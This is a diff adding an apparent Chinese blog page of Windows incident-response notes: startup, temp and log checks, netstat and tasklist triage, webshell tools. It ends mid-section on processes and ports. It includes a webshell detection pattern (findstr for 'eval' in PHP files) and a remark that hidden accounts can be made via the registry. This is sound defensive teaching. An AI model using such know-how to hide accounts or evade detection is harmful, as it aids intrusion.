@@ -1,0 +1,1046 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>应急响应 | XUAN Blog</title><meta name="author" content="xuan23"><meta name="copyright" content="xuan23"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="windows文件排查（1）查看开机启动有无异常文件【开始】➜【运行】➜【msconfig】   任务管理器中也可进行查看   （2）各个盘下的temp( tmp)相关目录下查看有无异常文件 ：Windows产生的临时文件   （3）浏览器浏览痕迹、浏览器 下载文件、浏览器cookie信息，根据不同浏览器进行排查；例如：IE浏览器，打开IE浏览器点击【查看】➜【浏览器栏】➜【历史记录】（快捷键是C">
+<meta property="og:type" content="article">
+<meta property="og:title" content="应急响应">
+<meta property="og:url" content="https://xuan-1117.github.io/2026/03/22/WEB/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/index.html">
+<meta property="og:site_name" content="XUAN Blog">
+<meta property="og:description" content="windows文件排查（1）查看开机启动有无异常文件【开始】➜【运行】➜【msconfig】   任务管理器中也可进行查看   （2）各个盘下的temp( tmp)相关目录下查看有无异常文件 ：Windows产生的临时文件   （3）浏览器浏览痕迹、浏览器 下载文件、浏览器cookie信息，根据不同浏览器进行排查；例如：IE浏览器，打开IE浏览器点击【查看】➜【浏览器栏】➜【历史记录】（快捷键是C">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://xuan-1117.github.io/img/backgrounds/bg-20.png">
+<meta property="article:published_time" content="2026-03-22T00:39:45.000Z">
+<meta property="article:modified_time" content="2026-06-06T14:26:49.917Z">
+<meta property="article:author" content="xuan23">
+<meta property="article:tag" content="WEB">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://xuan-1117.github.io/img/backgrounds/bg-20.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "应急响应",
+  "url": "https://xuan-1117.github.io/2026/03/22/WEB/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/",
+  "image": "https://xuan-1117.github.io/img/backgrounds/bg-20.png",
+  "datePublished": "2026-03-22T00:39:45.000Z",
+  "dateModified": "2026-06-06T14:26:49.917Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "xuan23",
+      "url": "https://xuan-1117.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://xuan-1117.github.io/2026/03/22/WEB/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.5-b1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '应急响应',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 8.1.2"></head><body><div class="bg-animation" id="web_bg" style="background-image: url(/img/backgrounds/bg-06.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">46</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/backgrounds/bg-20.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">XUAN Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">应急响应</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">应急响应</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-03-22T00:39:45.000Z" title="发表于 2026-03-22 08:39:45">2026-03-22</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-06-06T14:26:49.917Z" title="更新于 2026-06-06 22:26:49">2026-06-06</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/WEB/">WEB</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h1><h3 id="文件排查"><a href="#文件排查" class="headerlink" title="文件排查"></a><font style="color:rgb(79, 79, 79);">文件排查</font></h3><p><strong><font style="color:rgb(77, 77, 77);">（1）查看开机启动有无异常文件</font></strong><br><font style="color:rgb(77, 77, 77);">【开始】➜【运行】➜【msconfig】</font></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/assets/docs/WEB/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/img-001.png"></p>
+<p><a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E4%BB%BB%E5%8A%A1%E7%AE%A1%E7%90%86%E5%99%A8&spm=1001.2101.3001.7020"><font style="color:rgb(252, 85, 49);">任务管理器</font></a><font style="color:rgb(77, 77, 77);">中也可进行查看</font></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/assets/docs/WEB/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/img-002.png"></p>
+<p><strong><font style="color:rgb(77, 77, 77);">（2）各个盘下的temp( tmp)相关目录下查看有无异常文件 ：Windows产生的临时文件</font></strong></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/assets/docs/WEB/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/img-003.png"></p>
+<p><strong><font style="color:rgb(77, 77, 77);">（3）浏览器浏览痕迹、浏览器 下载文件、浏览器cookie信息，根据不同浏览器进行排查；例如：IE浏览器，打开IE浏览器点击【查看】➜【浏览器栏】➜【历史记录】（快捷键是Ctrl+Shift+H）</font></strong></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/assets/docs/WEB/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/img-004.png"></p>
+<p><strong>（4）Recent是系统文件夹，里面存放着你最近使用的文档的快捷方式，查看用户recent相关文件，通过分析最近打开分析可疑文件：</strong></p>
+<p>【开始】➜【运行】➜【%UserProfile%\Recent】</p>
+<p><strong>（5）根据文件夹内文件列表时间 进行排序，查找可疑文件。当然也可以搜索指定日期范围的文件及文件</strong></p>
+<p>1.了解应急的时间轴，以及确定攻击ip</p>
+<p>2.根据发生安全事件的时间轴梳理事件流程</p>
+<p>3.根据时间轴查找可疑文件，减少可疑文件范围）</p>
+ <!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/assets/docs/WEB/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/img-005.png"></p>
+<p><strong><font style="color:rgb(77, 77, 77);">（6）查看文件时间，创建时间、修改时间、访问时间 ，黑客通过菜刀类工具改变的是修改时间。所以如果修改时间在创建时间之前明显是可疑文件</font></strong></p>
+<p><strong><font style="color:rgb(77, 77, 77);">（7）搜索webshell 相关内容</font></strong></p>
+<p><font style="color:rgb(77, 77, 77);">例如：PHP webshell</font><strong><font style="color:rgb(77, 77, 77);"><br></font></strong><font style="color:rgb(77, 77, 77);">findstr Window系统自带的命令，查找指定的一个或多个文件</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">findstr /m /i /s “eval” *.php  (注意字符串编码格式)</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(77, 77, 77);">参数说明：</font></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/m		如果文件包含匹配项，则仅打印该文件名 </span><br><span class="line">/i      指定搜索不区分大小写</span><br><span class="line">/s      在当前目录和所有子目录中搜索匹配的文件</span><br><span class="line">/b      如果位于行的开头则匹配模式</span><br><span class="line">/e      如果位于行的末尾则匹配模式</span><br><span class="line">/x      打印完全匹配的行</span><br><span class="line">/v      只打印不包含匹配的行</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="进程排查"><a href="#进程排查" class="headerlink" title="进程排查"></a><font style="color:rgb(79, 79, 79);">进程排查</font></h3><p><strong><font style="color:rgb(77, 77, 77);">（1）netstat -ano 查看目前的网络连接，定位可疑的ESTABLISHED</font></strong></p>
+<p><font style="color:rgb(77, 77, 77);">参数说明：</font></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-a      显示所有网络连接、路由表和网络接口信息</span><br><span class="line">-n	    以数字形式显示地址和端口号</span><br><span class="line">-o      显示与每个连接相关的所属进程 ID</span><br><span class="line">-r		显示路由表</span><br><span class="line">-s		显示按协议统计信息、默认地、显示IP</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(77, 77, 77);">常见的状态说明：</font></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LISTENING      侦听状态</span><br><span class="line">ESTABLISHED    建立连接</span><br><span class="line">CLOSE_WAIT     对方主动关闭连接或网络异常导致连接中断</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(77, 77, 77);">netstat -ano | findstr ESTABLISH</font></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/assets/docs/WEB/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/img-006.png"></p>
+<p><strong><font style="color:rgb(77, 77, 77);">（2）根据netstat定位出的pid，再通过tasklist 命令进行进程定位</font></strong></p>
+<p><strong><font style="color:rgb(77, 77, 77);">tasklist | findstr 13120</font></strong></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/assets/docs/WEB/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/img-007.png"></p>
+<p><strong><font style="color:rgb(77, 77, 77);">（3）根据wmic process 获取进程的全路径 [任务管理器也可以定位到进程路径]</font></strong></p>
+<p><strong><font style="color:rgb(77, 77, 77);">wmic process | findstr chrome</font></strong></p>
+<h3 id="系统信息排查"><a href="#系统信息排查" class="headerlink" title="系统信息排查"></a><font style="color:rgb(79, 79, 79);">系统信息排查</font></h3><p><strong><font style="color:rgb(77, 77, 77);">（1）查看环境 变量的设置</font></strong></p>
+<p><font style="color:rgb(77, 77, 77);">【我的电脑】➜【属性】➜【高级系统设置】➜【高级】➜【环境变量】</font></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/assets/docs/WEB/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/img-008.png"></p>
+<p><font style="color:rgb(77, 77, 77);">排查内容：temp变量的所在位置的内容；后缀映射PATHEXT是否包含有非windows的后缀；有没有增加其他的路径到PATH变量中(对用户变量和系统变量都要进行排查)；</font></p>
+<p><strong><font style="color:rgb(77, 77, 77);">（2）Windows 计划任务</font></strong></p>
+<p><font style="color:rgb(77, 77, 77);">【程序】➜【附件】➜【系统工具】➜【任务计划程序】</font></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/assets/docs/WEB/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/img-009.png"></p>
+<p><strong><font style="color:rgb(77, 77, 77);">（3）Windows帐号信息，如隐藏帐号等</font></strong></p>
+<p><font style="color:rgb(77, 77, 77);">【开始】➜【运行】➜【compmgmt.msc】➜【本地用户和组】➜【用户】 (用户名以$结尾的为隐藏用户，如：admin $)</font></p>
+<p><font style="color:rgb(77, 77, 77);">命令行方式：net user，可直接收集用户信息（此方法看不到隐藏用户），若需查看某个用户的详细信息，可使用命令➜net user username；</font></p>
+<p><font style="color:rgb(77, 77, 77);">使用d盾可以直接查看隐藏用户</font></p>
+<p><strong><font style="color:rgb(77, 77, 77);">（4）查看当前系统用户的会话</font></strong></p>
+<p><font style="color:rgb(77, 77, 77);">使用➜ query user 查看当前系统的会话，比如查看是否有人使用远程终端登录服务器；</font></p>
+<p><font style="color:rgb(77, 77, 77);">logoff id 踢出该用户；</font></p>
+<p><strong><font style="color:rgb(77, 77, 77);">（5）查看systeminfo 信息，系统版本以及补丁信息</font></strong></p>
+<h3 id="工具排查"><a href="#工具排查" class="headerlink" title="工具排查"></a><font style="color:rgb(79, 79, 79);">工具排查</font></h3><p><strong><font style="color:rgb(77, 77, 77);">（1）PC Hunter</font></strong></p>
+<p><font style="color:rgb(77, 77, 77);">PC Hunter是一个Windows系统信息查看软件</font></p>
+<p><font style="color:rgb(77, 77, 77);">功能列表如下：</font></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">1.进程、线程、进程模块、进程窗口、进程内存信息查看，杀进程、杀线程、卸载模块等功能</span><br><span class="line">2.内核驱动模块查看，支持内核驱动模块的内存拷贝</span><br><span class="line">3.SSDT、Shadow SSDT、FSD、KBD、TCPIP、Classpnp、Atapi、Acpi、SCSI、IDT、GDT信息查看，并能检测和恢复ssdt hook和inline hook</span><br><span class="line">4.CreateProcess、CreateThread、LoadImage、CmpCallback、BugCheckCallback、Shutdown、Lego等Notify Routine信息查看，并支持对这些Notify Routine的删除</span><br><span class="line">5.端口信息查看，目前不支持2000系统</span><br><span class="line">6.查看消息钩子</span><br><span class="line">7.内核模块的iat、eat、inline hook、patches检测和恢复</span><br><span class="line">8.磁盘、卷、键盘、网络层等过滤驱动检测，并支持删除</span><br><span class="line">9.注册表编辑</span><br><span class="line">10.进程iat、eat、inline hook、patches检测和恢复</span><br><span class="line">11.文件系统查看，支持基本的文件操作</span><br><span class="line">12.查看（编辑）IE插件、SPI、启动项、服务、Host文件、映像劫持、文件关联、系统防火墙规则、IME</span><br><span class="line">13.ObjectType Hook检测和恢复</span><br><span class="line">14.DPC定时器检测和删除</span><br><span class="line">15.MBR Rootkit检测和修复</span><br><span class="line">16.内核对象劫持检测</span><br><span class="line">17.WorkerThread枚举</span><br><span class="line">18.Ndis中一些回调信息枚举</span><br><span class="line">19.硬件调试寄存器、调试相关API检测</span><br><span class="line">20.枚举SFilter/Fltmgr的回调</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>原文链接：</p>
+<p><strong><font style="color:rgb(77, 77, 77);">（2）ProcessExplorer</font></strong></p>
+<p><font style="color:rgb(77, 77, 77);">Windows系统和应用程序监视工具;</font></p>
+<p><strong><font style="color:rgb(77, 77, 77);">（3）Microsoft Network Monitor</font></strong></p>
+<p><strong><font style="color:rgb(77, 77, 77);">（4）D盾Webshell 排查</font></strong></p>
+<p><strong><font style="color:rgb(77, 77, 77);">（5）河马webshell查杀</font></strong></p>
+<h3 id="日志排查"><a href="#日志排查" class="headerlink" title="日志排查"></a><font style="color:rgb(79, 79, 79);">日志排查</font></h3><p><strong><font style="color:rgb(77, 77, 77);">（1）Windows登录日志排查</font></strong></p>
+<p><font style="color:rgb(77, 77, 77);">a）打开事件管理器</font><strong><font style="color:rgb(77, 77, 77);"><br></font></strong><font style="color:rgb(77, 77, 77);">【开始】➜【管理工具】➜【事件查看】</font><strong><font style="color:rgb(77, 77, 77);"><br></font></strong><font style="color:rgb(77, 77, 77);">【开始】➜【运行】➜【eventvwr】</font></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/assets/docs/WEB/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/img-010.png"></p>
+<p><font style="color:rgb(77, 77, 77);">b）主要分析安全日志，可以借助自带的筛选、查找、导出功能</font></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/assets/docs/WEB/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/img-011.png"></p>
+<p><font style="color:rgb(77, 77, 77);">可以把日志导出为文本格式，然后使用notepad++ 打开，使用正则模式去匹配远程登录过的IP地址，在界定事件日期范围的基础。</font></p>
+<p><strong><font style="color:rgb(77, 77, 77);">（2）IIS日志排查</font></strong></p>
+<p><font style="color:rgb(77, 77, 77);">a）查找IIS日志存放位置</font><strong><font style="color:rgb(77, 77, 77);"><br></font></strong><font style="color:rgb(77, 77, 77);">【开始】➜【IIS管理器】➜【网站】➜【日志】</font><strong><font style="color:rgb(77, 77, 77);"><br></font></strong><font style="color:rgb(77, 77, 77);">IIS7.0：%SystemDrive%\inetpub\logs\LogFiles</font></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/assets/docs/WEB/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/img-012.png"></p>
+<p>b）Log Parser 快速日志分析工具</p>
+<p>Log Parser是一个用于日志文件分析的使用简单又强大的工具，多用于分析IIS web服务器的日志，支持基于文本的日志文件、XML 文件、CSV（逗号分隔符）文件以及注册表、文件系统等内容，它可以把相应的分析结果以图形的形式展现出来，大大地方便了运营人员；</p>
+<p><font style="color:rgb(77, 77, 77);">下载地址：</font><br><a target="_blank" rel="noopener" href="https://www.microsoft.com/en-us/download/confirmation.aspx?id=24659"><font style="color:rgb(78, 161, 219);">https://www.microsoft.com/en-us/download/confirmation.aspx?id=24659</font></a></p>
+<p><font style="color:rgb(78, 161, 219);"></font></p>
+<p>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq1140037586/article/details/130582989">https://blog.csdn.net/qq1140037586/article/details/130582989</a></p>
+<h1 id="【命令汇总】Windows-应急响应"><a href="#【命令汇总】Windows-应急响应" class="headerlink" title="【命令汇总】Windows 应急响应"></a><a target="_blank" rel="noopener" href="https://www.cnblogs.com/v1vvwv/p/Windows-Emergency-Response.html"><font style="color:rgb(0, 0, 0);">【命令汇总】Windows 应急响应</font></a></h1><h2 id="0x00、前言"><a href="#0x00、前言" class="headerlink" title="0x00、前言"></a><font style="color:rgb(0, 136, 145);">0x00、前言</font></h2><p><font style="color:rgb(0, 0, 0);">常见的应急分类：</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">web入侵：网页挂马、主页篡改、Webshell</span><br><span class="line">系统入侵：病毒木马、勒索软件、远控后门</span><br><span class="line">网络攻击：DDOS攻击、DNS劫持、ARP欺骗</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x01、入侵排查过程"><a href="#0x01、入侵排查过程" class="headerlink" title="0x01、入侵排查过程"></a><font style="color:rgb(0, 136, 145);">0x01、入侵排查过程</font></h2><h3 id="1-1-系统账户相关"><a href="#1-1-系统账户相关" class="headerlink" title="1.1 系统账户相关"></a><font style="color:rgb(1, 110, 140);">1.1 系统账户相关</font></h3><p><font style="color:rgb(0, 0, 0);">注意事项：弱口令、22&#x2F;3389 等端口是否对外</font></p>
+<p><font style="color:rgb(0, 0, 0);">查看账号的方法：</font></p>
+<ol>
+<li><code>&lt;font style=&quot;color:rgb(192, 52, 29);background-color:rgb(245, 245, 245) !important;&quot;&gt;net user&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);">（无法列出$用户）</font></li>
+<li><code>&lt;font style=&quot;color:rgb(192, 52, 29);background-color:rgb(245, 245, 245) !important;&quot;&gt;lusrmgr.exe&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);">（无法找到注册表方式建立的用户）</font></li>
+<li><font style="color:rgb(0, 0, 0);">查看注册表（最准）</font><code>&lt;font style=&quot;color:rgb(192, 52, 29);background-color:rgb(245, 245, 245) !important;&quot;&gt;HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\&lt;/font&gt;</code></li>
+<li><font style="color:rgb(0, 0, 0);">D 盾有查看账户的功能</font></li>
+</ol>
+<p><font style="color:rgb(0, 0, 0);">查看登录日志：<br></font><code>&lt;font style=&quot;color:rgb(192, 52, 29);background-color:rgb(245, 245, 245) !important;&quot;&gt;eventvwr.msc&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);">，然后使用</font><font style="color:rgb(0, 0, 0);"> </font><code>&lt;font style=&quot;color:rgb(192, 52, 29);background-color:rgb(245, 245, 245) !important;&quot;&gt;Log Parser&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);"> </font><font style="color:rgb(0, 0, 0);">进行日志审计。</font></p>
+<p><font style="color:rgb(0, 0, 0);">BTW：可以通过改注册表的方式，来建立隐藏的账户</font></p>
+<h3 id="1-2-进程、端口相关"><a href="#1-2-进程、端口相关" class="headerlink" title="1.2 进程、端口相关"></a><font style="color:rgb(1, 110, 140);">1.2 进程、端口相关</font></h3><p><font style="color:rgb(0, 0, 0);">查看开放的端口：</font><code>&lt;font style=&quot;color:rgb(192, 52, 29);background-color:rgb(245, 245, 245) !important;&quot;&gt;netstat -ano&lt;/font&gt;</code></p>
+<p><font style="color:rgb(0, 0, 0);">重点看状态是 ESTABLISHED 的端口：</font><code>&lt;font style=&quot;color:rgb(192, 52, 29);background-color:rgb(245, 245, 245) !important;&quot;&gt;netstat -ano | findstr &#39;estab&#39;&lt;/font&gt;</code></p>
+<p><font style="color:rgb(0, 0, 0);">查看路由：</font><code>&lt;font style=&quot;color:rgb(192, 52, 29);background-color:rgb(245, 245, 245) !important;&quot;&gt;netstat -rn&lt;/font&gt;</code></p>
+<p><font style="color:rgb(0, 0, 0);">查看系统信息：</font><code>&lt;font style=&quot;color:rgb(192, 52, 29);background-color:rgb(245, 245, 245) !important;&quot;&gt;msinfo32&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);">，依次点击</font><font style="color:rgb(0, 0, 0);"> </font><code>&lt;font style=&quot;color:rgb(192, 52, 29);background-color:rgb(245, 245, 245) !important;&quot;&gt;软件环境→正在运行任务&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);">，可以看到当前的进程</font></p>
+<p><font style="color:rgb(0, 0, 0);">查找 PID 对应的进程：</font><font style="color:rgb(0, 0, 0);"> </font><code>&lt;font style=&quot;color:rgb(192, 52, 29);background-color:rgb(245, 245, 245) !important;&quot;&gt;tasklist | findstr PID&lt;/font&gt;</code></p>
+<p><font style="color:rgb(0, 0, 0);">杀死进程：</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">taskkill /f /pid 123 /t</span><br><span class="line">taskkill /f /im explorer.exe /t</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(0, 0, 0);">查看进程对应的文件：依次输入</font><font style="color:rgb(0, 0, 0);"> </font><code>&lt;font style=&quot;color:rgb(192, 52, 29);background-color:rgb(245, 245, 245) !important;&quot;&gt;wmic&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);">–</font><font style="color:rgb(0, 0, 0);"> </font><code>&lt;font style=&quot;color:rgb(192, 52, 29);background-color:rgb(245, 245, 245) !important;&quot;&gt;process&lt;/font&gt;</code></p>
+<p><font style="color:rgb(0, 0, 0);">显示 进程–PID–服务：</font><code>&lt;font style=&quot;color:rgb(192, 52, 29);background-color:rgb(245, 245, 245) !important;&quot;&gt;tasklist /svc&lt;/font&gt;</code></p>
+<p><font style="color:rgb(0, 0, 0);">查看 Windows 服务所对应的端口：<br></font><code>&lt;font style=&quot;color:rgb(192, 52, 29);background-color:rgb(245, 245, 245) !important;&quot;&gt;%system%/system32/drivers/etc/services（一般 %system% 就是 C:\Windows ）&lt;/font&gt;</code></p>
